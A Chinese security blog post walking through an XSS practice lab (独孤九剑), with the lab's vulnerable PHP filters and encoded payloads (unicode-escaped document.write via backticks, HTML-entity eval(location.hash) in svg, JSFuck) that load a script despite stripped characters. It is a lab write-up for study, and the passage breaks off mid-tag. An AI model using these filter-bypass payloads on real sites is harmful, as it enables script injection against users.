<!-- build time:Wed Dec 27 2023 18:05:50 GMT+0800 (Central Standard Time) --><!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#FFF"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="alternate" type="application/rss+xml" title="余星酒" href="http://example.com/rss.xml"><link rel="alternate" type="application/atom+xml" title="余星酒" href="http://example.com/atom.xml"><link rel="alternate" type="application/json" title="余星酒" href="http://example.com/feed.json"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.2.5"><meta name="keywords" content="渗透测试,靶场"><link rel="canonical" href="http://example.com/APT/%E9%9D%B6%E5%9C%BAwp/%E9%9D%B6%E5%9C%BA/xss%E7%8B%AC%E5%AD%A4%E4%B9%9D%E5%89%91/%E7%8B%AC%E5%AD%A4%E4%B9%9D%E5%89%91/"><title>独孤九剑-xss - 渗透测试 | 余星酒 = 余星酒 = 痴看年少风雨疾，一转本生蹉跎游</title><meta name="generator" content="Hexo 6.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">独孤九剑-xss</h1><div class="meta"><span class="item" title="创建时间：2023-07-25 00:08:00"><span class="icon"><i class="ic i-calendar"></i> </span><span class="text">发表于</span> <time itemprop="dateCreated datePublished" datetime="2023-07-25T00:08:00+08:00">2023-07-25</time></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span> <span class="line"></span> <span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">余星酒</a></li></ul><ul class="right"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div id="imgs" class="pjax"><ul><li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gicli9lfebj20zk0m84qp.jpg"></li><li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclhpw3lwj20zk0m8gvw.jpg"></li><li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gicliierfjj20zk0m8npd.jpg"></li><li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclwrdwyaj20zk0m8are.jpg"></li><li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclj61ylzj20zk0m8b29.jpg"></li><li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclxxcb6rj20zk0m8b29.jpg"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"/></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"/><use xlink:href="#gentle-wave" x="48" y="3"/><use xlink:href="#gentle-wave" x="48" y="5"/><use xlink:href="#gentle-wave" x="48" y="7"/></g></svg></div><main><div class="inner"><div id="main" class="pjax"><div class="article wrap"><div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i> <span><a href="/">首页</a></span><i class="ic i-angle-right"></i> <span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/APT/" itemprop="item" rel="index" title="分类于 渗透测试"><span itemprop="name">渗透测试</span></a><meta itemprop="position" content="1"></span></div><article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="http://example.com/APT/%E9%9D%B6%E5%9C%BAwp/%E9%9D%B6%E5%9C%BA/xss%E7%8B%AC%E5%AD%A4%E4%B9%9D%E5%89%91/%E7%8B%AC%E5%AD%A4%E4%B9%9D%E5%89%91/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/avatar.jpg"><meta itemprop="name" content="余星酒"><meta itemprop="description" content="痴看年少风雨疾，一转本生蹉跎游, 欢迎参观我的笔记空间 ~ 这里主要会记录一些安全相关的学习笔记 🌸"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="余星酒"></span><div class="body md" itemprop="articleBody"><h1 id="独孤九剑"><a class="anchor" href="#独孤九剑">#</a> 独孤九剑</h1><ol><li>在 JavaScript 中加载 JS 的代码</li></ol><figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://127.0.0.1/1.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></pre></td></tr></table></figure><p>这是最基本的加载 JS 的方式，但我们需要在页面中加载这个 JS 代码，就需要用到 document.write () 将上面的代码写入 HTML 中，从而执行 js 代码，如果用到这个方法，还需要使用 标签</p><figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"http://127.0.0.1/1.js"</span><span class="token operator">></span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></pre></td></tr></table></figure><ol start="2"><li>加载外部 JS 代码时，外部 JS 代码不需要写标签</li><li>document.write 可以输出 native 编码格式的数据</li><li>反引号可以替换括号的作用</li><li>JSFuck</li></ol><figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre>false => ![]</pre></td></tr><tr><td data-num="2"></td><td><pre>true => !![]</pre></td></tr><tr><td data-num="3"></td><td><pre>undefined => [][[]]</pre></td></tr><tr><td data-num="4"></td><td><pre>NaN => +[![]]</pre></td></tr><tr><td data-num="5"></td><td><pre>0 => +[]</pre></td></tr><tr><td data-num="6"></td><td><pre>1 => +!+[]</pre></td></tr><tr><td data-num="7"></td><td><pre>2 => !+[]+!+[]</pre></td></tr><tr><td data-num="8"></td><td><pre>10 => [+!+[]]+[+[]]</pre></td></tr><tr><td data-num="9"></td><td><pre>Array => []</pre></td></tr><tr><td data-num="10"></td><td><pre>Number => +[]</pre></td></tr><tr><td data-num="11"></td><td><pre>String => []+[]</pre></td></tr><tr><td data-num="12"></td><td><pre>Boolean => ![]</pre></td></tr><tr><td data-num="13"></td><td><pre>Function =>[][“filter”]`</pre></td></tr><tr><td data-num="14"></td><td><pre>eval => []["filter"]["constructor"](CODE)()</pre></td></tr><tr><td data-num="15"></td><td><pre>window => []["filter"]["constructor"]("return this")()</pre></td></tr></table></figure><h2 id="第一式"><a class="anchor" href="#第一式">#</a> 第一式</h2><blockquote><p>[!ob-info] 过滤了 = ( )</p></blockquote><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token variable">$data</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"="</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"("</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">")"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="9"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="10"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>独孤九剑-第一式<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="13"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>独孤九剑-第一式<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>过滤了 =()，少侠骨骼惊奇，必是练武奇才<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="15"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>要求加载任意 JS 代码,成功加载 http://127.0.0.1/mpy-web/xss/alert.js 表示完成挑战<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$data</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></pre></td></tr></table></figure><h3 id="documentwrite-native编码"><a class="anchor" href="#documentwrite-native编码">#</a> document.write` `+native 编码</h3><ol><li>利用反引号 ` 来替代 ( )</li><li>利用 document.write 可以打印输出 native 编码格式的数据来绕过 =</li></ol><figure class="highlight url"><figcaption data-lang="url"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token scheme">http<span class="token scheme-delimiter">:</span></span><span class="token authority"><span class="token authority-delimiter">//</span><span class="token host"><span class="token ipv4-address">127.0.0.1</span></span></span><span class="token path"><span class="token path-separator">/</span>mpy-web<span class="token path-separator">/</span>xss<span class="token path-separator">/</span>xss-1.php</span><span class="token query"><span class="token query-delimiter">?</span><span class="token pair"><span class="token key">data</span>=<span class="token value">%22%3E%3Cscript%3Edocument.write</span></span></span>`\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u0020\u0073\u0072\u0063\u003d\u0022\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0031\u0032\u0037\u002e\u0030\u002e\u0030\u002e\u0031\u002f\u006d\u0070\u0079\u002d\u0077\u0065\u0062\u002f\u0078\u0073\u0073\u002f\u0061\u006c\u0065\u0072\u0074\u002e\u006a\u0073\u0022\u003e\u003c\u002f\u0073\u0063\u0072\u0069\u0070\u0074\u003e\u000a`%3C/script%3E</pre></td></tr></table></figure><p>Poc:</p><figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>3E<span class="token operator">%</span>3Cscript<span class="token operator">%</span>3Edocument<span class="token punctuation">.</span>write<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u0020\u0073\u0072\u0063\u003d\u0022\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0031\u0032\u0037\u002e\u0030\u002e\u0030\u002e\u0031\u002f\u006d\u0070\u0079\u002d\u0077\u0065\u0062\u002f\u0078\u0073\u0073\u002f\u0061\u006c\u0065\u0072\u0074\u002e\u006a\u0073\u0022\u003e\u003c\u002f\u0073\u0063\u0072\u0069\u0070\u0074\u003e\u000a</span><span class="token template-punctuation string">`</span></span><span class="token operator">%</span>3C<span class="token operator">/</span>script<span class="token operator">%</span>3E</pre></td></tr></table></figure><p>成功闭合之后向页面写入一个 script 脚本</p><h3 id="svghtml实体编码"><a class="anchor" href="#svghtml实体编码">#</a> svg+html 实体编码</h3><figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre>http://127.0.0.1/mpy-web/xss/xss-1.php?data="><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token operator">&amp;</span>#x65<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x76<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x61<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6c<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x28<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6c<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6f<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x63<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x61<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x74<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x69<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6f<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6e<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x2e<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x68<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x61<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x73<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x68<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x2e<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x73<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6c<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x69<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x63<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x65<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x28<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x31<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x29<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x29<span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>svg</span><span class="token punctuation">></span></span>#with(document)body.appendChild(createElement('script')).src='http://127.0.0.1/mpy-web/xss/alert.js'</pre></td></tr></table></figure><figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre>"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">eval</span><span class="token punctuation">(</span>location<span class="token punctuation">.</span>hash<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>svg</span><span class="token punctuation">></span></span>#with(document)body.appendChild(createElement('script')).src='http://127.0.0.1/mpy-web/xss/alert.js'</pre></td></tr></table></figure><ol><li>首先使用了 <code>&lt;svg&gt;</code> 标签，因为在 <code>&lt;svg&gt;</code> 标签中的 <code>&lt;script&gt;</code> 可以使用 html 编码，对其里面的数据进行编码可绕过</li><li><code>&lt;script&gt;</code> 标签中的是 <code>eval()</code> 函数</li><li><code>eval()</code> 函数计算 <code>javascript字符串</code> ，并把它作为脚本代码来执行，如果参数是一个表达式，eval () 将作为表达式， <code>如果参数是javascript语句，eval()将执行javascript语句</code></li><li>之后便是 <code>location.hash.slice(1)</code> ，hash 是 location 对象中的一个属性，是一个可读可写的字符串，该字符串是 URL 的锚点部分（从 #开始的部分）</li><li>而 <code>slice(start, end)</code> 方法可提取字符串的某个部分，并以新的字符串返回被提取的部分</li><li>start 参数字符串中的第一个字符位置为 0，第二个位置为 1，以此类推</li><li>总的来说，location.hash.slice (1) 的含义就是获取 #号之后的内容</li><li>之后就是 appendChild () 方法可以向节点的子节点列表的末尾添加新的子节点，也就是说从 DOM 树的角度，这个方法向 body 节点列表的最后添加了一个 script 节点，相当于直接添加了一个 <code>&lt;script&gt;</code> 标签</li></ol><p>Poc:</p><figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre>"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token operator">&amp;</span>#x65<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x76<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x61<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6c<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x28<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6c<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6f<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x63<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x61<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x74<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x69<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6f<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6e<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x2e<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x68<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x61<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x73<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x68<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x2e<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x73<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6c<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x69<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x63<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x65<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x28<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x31<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x29<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x29<span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>svg</span><span class="token punctuation">></span></span>#with(document)body.appendChild(createElement('script')).src='http://127.0.0.1/mpy-web/xss/alert.js'</pre></td></tr></table></figure><h2 id="第二式"><a class="anchor" href="#第二式">#</a> 第二式</h2><p>过滤了 <code>= ( ) .</code></p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token variable">$data</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"="</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"("</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">")"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="10"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>独孤九剑-第二式<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>独孤九剑-第二式<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="15"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>过滤了 =().，少侠骨骼惊奇，必是练武奇才<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>要求加载任意 JS 代码,成功加载 http://127.0.0.1/mpy-web/xss/alert.js 表示完成挑战<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$data</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></pre></td></tr></table></figure><h3 id="documentwritenative编码"><a class="anchor" href="#documentwritenative编码">#</a> document ['write']+native 编码</h3><p>在这种情况下， <code>document.write</code> 这样的用法就不起作用了，但是可以写成 <code>document['write']</code></p><figure class="highlight url"><figcaption data-lang="url"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token scheme">http<span class="token scheme-delimiter">:</span></span><span class="token authority"><span class="token authority-delimiter">//</span><span class="token host"><span class="token ipv4-address">127.0.0.1</span></span></span><span class="token path"><span class="token path-separator">/</span>mpy-web<span class="token path-separator">/</span>xss<span class="token path-separator">/</span>xss-1.php</span><span class="token query"><span class="token query-delimiter">?</span><span class="token pair"><span class="token key">data</span>=<span class="token value">%22%3E%3Cscript%3Edocument</span></span></span>['write']`\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u0020\u0073\u0072\u0063\u003d\u0022\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0031\u0032\u0037\u002e\u0030\u002e\u0030\u002e\u0031\u002f\u006d\u0070\u0079\u002d\u0077\u0065\u0062\u002f\u0078\u0073\u0073\u002f\u0061\u006c\u0065\u0072\u0074\u002e\u006a\u0073\u0022\u003e\u003c\u002f\u0073\u0063\u0072\u0069\u0070\u0074\u003e\u000a`%3C/script%3E</pre></td></tr></table></figure><p>直接修改第一式的 <code>document.write</code> 为 <code>document['write']</code></p><h3 id="svghtml实体编码-2"><a class="anchor" href="#svghtml实体编码-2">#</a> svg+html 实体编码</h3><figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre>http://127.0.0.1/mpy-web/xss/xss-2.php?data=%22%3E%3Csvg%3E%3Cscript%3E%26%23x65%3B%26%23x76%3B%26%23x61%3B%26%23x6c%3B%26%23x28%3B%26%23x6c%3B%26%23x6f%3B%26%23x63%3B%26%23x61%3B%26%23x74%3B%26%23x69%3B%26%23x6f%3B%26%23x6e%3B%26%23x2e%3B%26%23x68%3B%26%23x61%3B%26%23x73%3B%26%23x68%3B%26%23x2e%3B%26%23x73%3B%26%23x6c%3B%26%23x69%3B%26%23x63%3B%26%23x65%3B%26%23x28%3B%26%23x31%3B%26%23x29%3B%26%23x29%3B%3C/script%3E%3C/svg%3E#with(document)body.appendChild(createElement('script')).src='http://127.0.0.1/mpy-web/xss/alert.js'</pre></td></tr></table></figure><p>由于本身是 #锚点不会传入后台，且数据被 html 编码，故也可以直接拿来使用</p><h3 id="settimeunicode编码"><a class="anchor" href="#settimeunicode编码">#</a> setTime+unicode 编码</h3><figure class="highlight 